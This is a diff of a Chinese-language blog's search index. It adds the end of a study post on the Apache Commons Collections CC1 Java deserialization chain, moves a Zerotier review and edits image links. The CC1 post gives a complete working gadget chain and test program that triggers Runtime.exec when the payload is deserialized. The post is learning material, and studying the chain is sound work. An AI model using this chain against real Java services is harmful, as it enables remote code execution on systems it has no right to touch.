+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">m</span> <span class="operator">=</span> (Method)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime)<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(m);</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure>
+<p>这里有一个特征，第一行的结果作为第二行的输入，而第二行的结果又作为第三行的输入，且都是transform方法，ChainedTransformer类的transform方法刚好有这个功能</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">     	iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);<span class="comment">//前一对象transform方法的输出作为后一对象transform方法的输入</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>所以又可以将代码转换成</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = new Transformer[]&#123;</span><br><span class="line">        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chainedTransformer = new ChainedTransformer(Transformers);</span><br><span class="line">chainedTransformer.transform(Runtime.class);</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230322175528965.png" alt="image-20230322175528965"></p>
+<p>到这里就可以解决Runtime类反序列化的问题了，并且此时调用的transform方法也从最初的InvokerTransformer.transform(runtime)变成了<code>ChainedTransformer.transform(Runtime.class)</code></p>
+<h3 id="2个if判断语句">2个if判断语句</h3>
+<p>首先是第一个if，核心代码：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">annotationType = AnnotationType.getInstance(type);<span class="comment">//获取指定类型的注解类型</span></span><br><span class="line">Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<span class="comment">//返回一个Map类型的对象，存储了该注解类型中的所有成员变量信息，其中，键为成员变量的名称，值为成员变量的类型</span></span><br><span class="line"><span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">	<span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();<span class="comment">//获取传入的map遍历时的key，这个key我们可以自己定义</span></span><br><span class="line">	Class&lt;?&gt; memberType = memberTypes.get(name);<span class="comment">//通过key获取成员变量的类型</span></span><br><span class="line">	<span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;<span class="comment">//如果成员变量存在</span></span><br></pre></td></tr></table></figure>
+<p>要进入使条件为真的话，就要找到一个含有成员变量的注释类，这里我们找到了Retention类有个叫value的成员变量</p>
+<p><img src="image-20230322183208737.png" alt="image-20230322183208737"></p>
+<p>同时要修改我们传入的map的key值为value</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>第二个if判断成员变量的值是否为其所声明类型的实例，而这里肯定不是，所以不需要额外做手脚</p>
+<h3 id="setvalue-参数">setvalue()参数</h3>
+<p>要解决这个问题其实比较靠运气，因为对于setvalue()的参数我们不太好修改，但这里恰好有一个ConstantTransformer类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> iConstant;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>这个类的transform很离谱，不管输入什么都只是输出类里的iConstant，这就使得输入的参数“无效化”，同时返回的内容是我们想要的内容，于是将执行的代码做如下修改</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//令iConstant=Runtime.class，使得Runtime.class作为下一条的输入值</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">chainedTransformer.transform(<span class="string">&quot;fdsf&quot;</span>);<span class="comment">//这里不管传入什么参数都不会影响ConstantTransformer.transform传出的值</span></span><br></pre></td></tr></table></figure>
+<p><img src="image-20230322200354729.png" alt="image-20230322200354729"></p>
+<p>到这里三个问题都已经得到了解决</p>
+<h2 id="最后">最后</h2>
+<p>测试代码：</p>
+<p>最终的利用链：AnnotationInvocationHandler.readObject()-&gt;AbstractInputCheckedMapDecorator.MapEntry.setValue()-&gt;TransformedMap.checkSetValue()-&gt;InvokerTransformer.transform()</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.security.transforms.Transform;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.instrument.TransformerManager;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        </span><br><span class="line">		<span class="comment">//创建chainedTransformer对象来执行任意代码</span></span><br><span class="line">        Transformer[] Transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(Transformers);</span><br><span class="line">        </span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object,Object&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//AnnotationInvocationHandler实例化</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> constructor.newInstance(Retention.class,transformedMap);</span><br><span class="line">        </span><br><span class="line">		<span class="comment">//序列化与反序列化</span></span><br><span class="line">        Serialize(obj);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">objecj</span> <span class="operator">=</span> Unserialize(<span class="string">&quot;test.ser&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Serialize</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.ser&quot;</span>));</span><br><span class="line">        objectOutputStream.writeObject(a);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">Unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span>  Exception&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> (Object)objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="image-20230322203254905.png" alt="image-20230322203254905"></p>
+<p>其实但看整个利用链的话还是比较简单的，难的是有一些地方需要想办法绕过</p>
+<p>参考视频：</p>
+<p>【Java反序列化CommonsCollections篇(一) CC1链手写EXP】 <a href="https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e">https://www.bilibili.com/video/BV1no4y1U7E1/?share_source=copy_web&amp;vd_source=c7f71b9392bbbd1398d21bf06f9a793e</a></p>
+]]></content>
+      <categories>
+        <category>学习记录</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+      </tags>
   </entry>
   <entry>
     <title>seafile和alist使用体验</title>
@@ -206,10 +347,41 @@
       </tags>
   </entry>
   <entry>
-    <title>新年好</title>
-    <url>/post/happy-new-year/</url>
-    <content><![CDATA[<p>欢迎来到1y0ng的blog,今天是2023年的第一天，祝大家新年快乐</p>
+    <title>Zerotier的使用体验</title>
+    <url>/post/zerotier/</url>
+    <content><![CDATA[<h1 id="背景">背景</h1>
+<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
+<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
+<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
+<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
+<p><img src="ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
+<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
+<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
+<h1 id="Zerotier">Zerotier</h1>
+<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
+<p><img src="43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<h2 id="安装配置">安装配置</h2>
+<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
+<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
+<p>同时centos 的安装可以参照这位大佬的文章</p>
+<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
+<h2 id="体验">体验</h2>
+<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
+<p><img src="d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
+<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
+<h2 id="安全性">安全性</h2>
+<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
+<h1 id="结语">结语</h1>
+<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
+<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
 ]]></content>
+      <categories>
+        <category>使用体验</category>
+      </categories>
+      <tags>
+        <tag>zerotier</tag>
+      </tags>
   </entry>
   <entry>
     <title>利用ipv6搭建一台服务器</title>
@@ -219,11 +391,11 @@
 <h3 id="硬件需求">硬件需求</h3>
 <p>首先要搭建属于自己的服务器得要有一定的硬件条件，服务器其实就是一台一天24小时开启的计算机，家里有一台10年前的电脑，处理器是4核的赛扬j1900，其实已经是满足我的基本需求了的，但一是电脑已经装了windows系统并储存了一些资料不能随意重装linux系统，所以我决定买一台迷你主机。</p>
 <p>在某鱼上花280买了一台<strong>迷你主机</strong>，处理器是奔腾n3540,4+256的，同时准备一个储存<strong>大于或等于8G</strong>的u盘</p>
-<p><img src="https://img-blog.csdnimg.cn/761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="761de0f3c70c43659a554c024a231ea0.jpeg" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <h3 id="准备工作">准备工作</h3>
 <p>我准备使用<strong>centos7</strong>作为服务器的操作系统，所以要下载centos7的镜像</p>
 <p><a href="http://mirrors.aliyun.com/centos/7/isos/x86_64/">centos-7-isos-x86_64安装包下载_开源镜像站-阿里云 (aliyun.com)</a></p>
-<p><img src="https://img-blog.csdnimg.cn/55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="55ec81e2cb7f4039b6d0396ba8f6dbd1.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <p>下载balenaetcher将iso文件烧录至U盘中</p>
 <p><a href="https://www.balena.io/etcher#download-etcher">balenaEtcher - Flash OS images to SD cards &amp; USB drives</a></p>
 <p>可以以这个up主的视频作为参考</p>
@@ -231,7 +403,7 @@
 <a href="https://b23.tv/dgXG2DN">（下）200买的小主机主板。刷机centos系统，centos服务器安装宝塔本地建站，保姆级教学，_哔哩哔哩_bilibili</a></p>
 <h3 id="安装系统">安装系统</h3>
 <p>安装系统的步骤参考上面两个视频，但可能会遇得到安装失败情况（俺就遇到了）</p>
-<p><img src="https://img-blog.csdnimg.cn/e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="e14067cf3de543a9b7e8d2ff3c9e7300.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <p>原因是因为计算机插入U盘以后加上计算机本身自带的储存空间一共有两块硬盘，而我们在安装的时候没有指定安装文件（.iso）在哪个硬盘里面，所以安装失败，只需选中正确的安装硬盘就可以了，解决方法可以参照下面两个大佬的方法：</p>
 <p><a href="https://blog.csdn.net/zwhfyy/article/details/78991446">Centos7安装时引导错误以及解决方案_zwhfyy的博客-CSDN博客_centos 安装报错</a></p>
 <p><a href="https://blog.csdn.net/weixin_34205826/article/details/93020109">Centos安装错误的解决方法_weixin_34205826的博客-CSDN博客</a></p>
@@ -245,7 +417,7 @@
 <p>目前如果在服务器上开启一些服务的话是通过<strong>http://[ipv6地址]:端口号</strong>来访问的，这样很麻烦，而且我们从运营商处得到的ipv6地址是一个**动态的地址，**随着计算机重启或者隔一段时间地址就会发生改变，所以我们要获取一个域名，并通过ddns将ipv6地址和域名绑定起来(懒得弄的也可以写个程序定时将ipv6地址发给自己)</p>
 <h3 id="获取域名">获取域名</h3>
 <p>国内获得域名可以通过很多的渠道，我这里是在<a href="https://wanwang.aliyun.com/?scm=20140722.S_card@@%E5%95%86%E5%93%81@@212429.S_cardgbdt.ID_card@@%E5%95%86%E5%93%81@@212429-RL_%E5%9F%9F%E5%90%8D-OR_ser-V_2-P0_0">阿里云</a>上花了8块买了一年的域名（需要实名认证），然后添加记录</p>
-<p><img src="https://img-blog.csdnimg.cn/86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
+<p><img src="86c56a549f2a47d4b4403705f2ac7017.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
 <p>记录类型选择<strong>AAAA表示ipv6地址</strong></p>
 <p>主机记录填写<strong>子域名名称</strong></p>
 <p>记录值填<strong>对应的ipv6地址</strong></p>
@@ -353,43 +525,6 @@
       </categories>
       <tags>
         <tag>后渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Zerotier的使用体验</title>
-    <url>/post/zerotier/</url>
-    <content><![CDATA[<h1 id="背景">背景</h1>
-<p>我的ipv6服务器是利用春节放假几天搭建起来的，平时是放在家里，而春节结束以后回到了实习租的房子里上班第一天就发现服务器无法访问了，ssh也连不上，但服务器可以出网（因为我的定时任务结束后会给我发消息）</p>
-<p>一开始怀疑是我的ddns脚本出了问题，因为阿里云的解析日志一直没有更新，就想通过<strong>爆破</strong>的方式获得真实的ipv6地址，也失败了（不得不说ipv6空间范围是真的大，开10个线程爆了我2小时，呜呜呜~~~）</p>
-<p><img src="https://image.3001.net/images/20220208/16443286461724.png" alt="img"></p>
-<p>周末回到家（论工作地点离家近的重要性hhh）才发现是ipv6地址被<strong>回收</strong>了，只给我留了个<strong>fe80</strong>开头的内网ipv6地址</p>
-<p><img src="https://img-blog.csdnimg.cn/ed356665c6d9454b8696d70828f6d416.jpeg" alt="img"></p>
-<p>重启路由器的ipv6开关以后又重新得到了ipv6地址（这里不知道是路由器配置的问题还是什么原因，有懂的师傅欢迎在评论区补充）</p>
-<p>为了防止这种情况再次发生，除了ipv6直接访问以外我还得有一种备用措施，在没有ipv6的情况下也能访问内网设备，于是Zerotier成为了我的目标</p>
-<h1 id="Zerotier">Zerotier</h1>
-<p>Zerotier是一款用于构建<strong>异地虚拟局域网</strong>的工具，通过网页后台创建虚拟网络并通过电脑上的Zerotier客户端连接各个异地电脑到虚拟局域网，从而实现组网由后台分配虚拟ip，并且各个异地电脑可以通过虚拟IP对同一虚拟局域网下的其他电脑进行访问</p>
-<p><img src="https://img-blog.csdnimg.cn/43d97752d6ff40539818eefbcb6289e2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<h2 id="安装配置">安装配置</h2>
-<p>Zerotier的安装配置都比较简单，可参照b站上这位up主的视频</p>
-<p><a href="https://www.bilibili.com/video/BV1hK4y1L7ND/?buvid=XU7B1187220CEA5BEB8E1D6547D1ECD2814F4&amp;is_story_h5=false&amp;mid=CZP6291YuQ9EvlArsK6mQw%3D%3D&amp;p=1&amp;plat_id=114&amp;share_from=ugc&amp;share_medium=android&amp;share_plat=android&amp;share_session_id=bb883d71-ff0f-45c4-ac3a-cdd56ff7cf9b&amp;share_source=COPY&amp;share_tag=s_i&amp;timestamp=1676083314&amp;unique_k=arTrXpi&amp;up_id=35973342&amp;vd_source=b2a0cc29ab6a8cf18c26c53dcd232ca4">强大的内网穿透工具ZeroTier，随时随地远程访问家中NAS和其它设备！没有公网IP也不怕_哔哩哔哩_bilibili</a></p>
-<p>同时centos 的安装可以参照这位大佬的文章</p>
-<p><a href="https://blog.csdn.net/COCO56/article/details/123296985#">https://blog.csdn.net/COCO56/article/details/123296985#</a></p>
-<h2 id="体验">体验</h2>
-<p>Zerotier和传统的内网穿透工具不同，并不是通过一个中转服务器来建立连接的，而是使用端到端的<strong>p2p</strong>协议（在连接不稳定的时候也会采用中转服务器的方式建立连接）</p>
-<p><img src="https://img-blog.csdnimg.cn/d14f7e6dbc424d29a8a9137b177fb8a2.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
-<p>可以看到延迟并不算很高，这几天用下来个人还是比较满意的</p>
-<p>通过这种方式可以部署一些<strong>只有内网ipv4才可以访问</strong>的服务，例如我就用niginx开了个ipv4的端口，将数据转发到了路由器上，下次ipv6出现问题也就可以直接通过Zerotier访问路由器重启ipv6服务</p>
-<h2 id="安全性">安全性</h2>
-<p>Zerotier作为一款强大的网络存取服务，拥有内置的AES-256加密算法，并提供安全控制，可以控制用户连接的访问，以限制对私有网络的访问，并防止未经授权的访问，所以Zerotier的安全性还是比较高的</p>
-<h1 id="结语">结语</h1>
-<p>总的来说，ZeroTier的使用确实非常容易。它的简单易用性，功能丰富的网络功能和强大的安全特性，使ZeroTier成为最佳的专业网络解决方案，特别是在新兴兼容性和技术能力需求时期。</p>
-<p>（此段结语由ChatGPT生成，嘻嘻~~，总的来说Zerotier还是比较简单好用的，有内网访问需求的伙伴们可以考虑使用）</p>
-]]></content>
-      <categories>
-        <category>使用体验</category>
-      </categories>
-      <tags>
-        <tag>zerotier</tag>
       </tags>
   </entry>
   <entry>
